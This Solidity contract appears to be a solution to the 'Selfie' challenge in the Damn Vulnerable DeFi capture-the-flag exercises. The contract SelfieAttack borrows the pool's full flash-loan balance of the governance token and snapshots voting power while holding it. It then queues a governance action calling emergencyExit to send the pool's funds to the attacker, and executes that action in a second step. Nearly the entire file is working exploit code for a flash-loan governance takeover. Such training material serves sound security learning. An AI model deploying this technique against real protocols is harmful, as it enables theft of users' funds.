// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

import "hardhat/console.sol";

contract SelfieAttack is IERC3156FlashBorrower{

    ERC20Snapshot token;
    SimpleGovernance governance;
    SelfiePool selfiePool;

    uint actionId;

    constructor(SelfiePool _selfiePool){
        selfiePool = _selfiePool;
        token = selfiePool.token();
        governance = selfiePool.governance();
    }

    function attack() public {
        // flashloan
        console.log("flashloan");
        // DamnValuableTokenSnapshot(address(token)).snapshot();

        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), selfiePool.maxFlashLoan(address(token)), "");
        console.log("executeAction");
        // executeAction
    }

    function attackStep2() public {
        governance.executeAction(actionId);
        console.log("emergencyExit");
        console.log("token.balanceOf(address(this))", token.balanceOf(msg.sender));
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32){
        // queueAction 
        // console.log("token.balanceOf(address(this))", token.balanceOf(address(this)));
        DamnValuableTokenSnapshot(address(token)).snapshot();
        // uint256 balance = DamnValuableTokenSnapshot(address(token)).getBalanceAtLastSnapshot(address(this));
        // console.log("getBalanceAtLastSnapshot", balance);

        actionId = governance.queueAction(address(selfiePool), 0, abi.encodeWithSelector(selfiePool.emergencyExit.selector, tx.origin));
        token.approve(address(selfiePool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}